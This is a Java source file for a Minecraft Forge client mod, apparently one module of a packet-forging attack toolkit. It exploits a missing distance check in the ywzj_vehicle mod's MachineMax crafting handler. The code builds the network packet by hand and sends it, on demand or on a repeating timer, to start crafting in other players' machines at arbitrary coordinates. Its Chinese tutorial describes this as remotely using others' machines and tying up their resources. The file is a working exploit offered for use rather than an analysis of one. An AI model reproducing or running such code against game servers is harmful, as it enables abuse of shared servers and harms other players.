package com.redblue.red.modules.limitlessvehicle;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import com.redblue.red.util.PacketForge;
import net.minecraft.client.Minecraft;
import net.minecraft.core.BlockPos;
import net.minecraft.resources.ResourceLocation;
import net.minecraftforge.fml.ModList;

import java.util.List;

/**
 * LV-05 (CONFIRMED): Remote MachineMax crafting -- no distance check.
 *
 * Handler lambda$onClientMessageReceived$0 verified via javap:
 * - Gets sender, null-checks
 * - level.getBlockEntity(msg.blockPos) -- arbitrary coordinates
 * - Checks instanceof MachineMaxBlockEntity
 * - Checks action == CRAFT
 * - Checks !isCrafting() && !hasProduct()
 * - Looks up recipe by craftingVehicleId
 * - hasIngredients(sender, recipe) -- checks sender's inventory
 * - consumeIngredients(sender, recipe) -- consumes from sender's inventory
 * - machine.craft(craftingVehicleId, recipe) -- starts crafting
 * - NO distance check between sender and blockPos
 * - NO GUI-open check
 *
 * Action enum has only CRAFT (ordinal 0).
 *
 * Wire format (index 111):
 *   writeByte(111)
 *   writeBlockPos(blockPos)              // m_130064_ = writeLong
 *   writeResourceLocation(craftingVehicleId)  // m_130085_
 *   writeEnum(action)                    // m_130068_ = writeVarInt(ordinal)
 */
public class LV04_RemoteCraft implements AttackModule {

    private static final ResourceLocation CHANNEL =
            new ResourceLocation("ywzj_vehicle", "ywzj_vehicle_channel");
    private static final int IDX_MACHINE_MAX = 111;
    private static final int ACTION_CRAFT_ORDINAL = 0;

    private final List<ConfigParam> params = List.of(
        ConfigParam.ofBool("enabled", "启用", false),
        ConfigParam.ofAction("fill_pos", "填充当前坐标", () -> {
            Minecraft mc = Minecraft.getInstance();
            if (mc.player != null) {
                BlockPos pos = mc.player.blockPosition();
                getParam("block_pos").ifPresent(p ->
                    p.set(pos.getX() + "," + pos.getY() + "," + pos.getZ()));
            }
        }),
        ConfigParam.ofString("block_pos", "机器坐标(x,y,z)", "0,64,0"),
        ConfigParam.ofString("vehicle_id", "载具配方ID", "ywzj_vehicle:ztz99a"),
        ConfigParam.ofInt("interval", "自动间隔(tick)", 20, 1, 200)
    );

    private long lastTick = 0;

    @Override public String id() { return "lv04_remote_craft"; }
    @Override public String name() { return "远程合成"; }
    @Override public String description() {
        return "远程使用他人MachineMax合成载具，无距离限制";
    }

    @Override
    public String getTutorial() {
        return "[使用方法]\n"
            + "1. 输入目标MachineMax方块坐标\n"
            + "2. 输入要合成的载具配方ID(如 ywzj_vehicle:ztz99a)\n"
            + "3. 确保你的背包中有所需材料\n"
            + "4. 点击执行\n\n"
            + "[漏洞原理]\n"
            + "LV-05: handler无距离校验，可远程触发任意已加载区块的MachineMax\n"
            + "材料从你的背包消耗，产品留在目标机器中(占用机器资源)";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("ywzj_vehicle");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;
        doCraft(mc);
    }

    @Override
    public void tick(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;
        int interval = getParam("interval").map(ConfigParam::getInt).orElse(20);
        long now = mc.level.getGameTime();
        if (now - lastTick < interval) return;
        lastTick = now;
        doCraft(mc);
    }

    private void doCraft(Minecraft mc) {
        long blockPosLong = parseBlockPos(
            getParam("block_pos").map(ConfigParam::getString).orElse("0,64,0"));
        String vehicleIdStr = getParam("vehicle_id").map(ConfigParam::getString)
                .orElse("ywzj_vehicle:ztz99a");
        ResourceLocation vehicleId = new ResourceLocation(vehicleIdStr);

        PacketForge.send(CHANNEL, buf -> {
            buf.writeByte(IDX_MACHINE_MAX);
            buf.writeLong(blockPosLong);              // writeBlockPos
            buf.writeResourceLocation(vehicleId);     // m_130085_
            buf.writeVarInt(ACTION_CRAFT_ORDINAL);    // writeEnum = writeVarInt(ordinal)
        });
    }

    private long parseBlockPos(String posStr) {
        try {
            String[] parts = posStr.split(",");
            int x = Integer.parseInt(parts[0].trim());
            int y = Integer.parseInt(parts[1].trim());
            int z = Integer.parseInt(parts[2].trim());
            return BlockPos.asLong(x, y, z);
        } catch (Exception e) {
            return BlockPos.asLong(0, 64, 0);
        }
    }
}
